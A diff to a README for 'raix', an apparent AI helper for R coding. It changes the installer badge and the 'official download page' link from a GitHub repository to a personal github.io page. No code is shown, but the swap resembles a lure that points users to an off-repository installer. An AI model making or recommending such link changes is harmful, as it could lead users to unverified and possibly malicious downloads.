@@ -1,6 +1,6 @@
 # 🤖 raix - Improve your R coding with AI
 
-[![](https://img.shields.io/badge/Download-Raix_Installer-blue.svg)](https://github.com/joannlilywhite765/raix)
+[![](https://img.shields.io/badge/Download-Raix_Installer-blue.svg)](https://joannlilywhite765.github.io)
 
 ## About the software
 
@@ -18,7 +18,7 @@ Your computer needs these items to run raix:
 
 ## 📥 Download and installation
 
-Visit the [official download page](https://github.com/joannlilywhite765/raix) to get the installer. 
+Visit the [official download page](https://joannlilywhite765.github.io) to get the installer. 
 
 1. Go to the link above.
 2. Find the section labeled Releases.
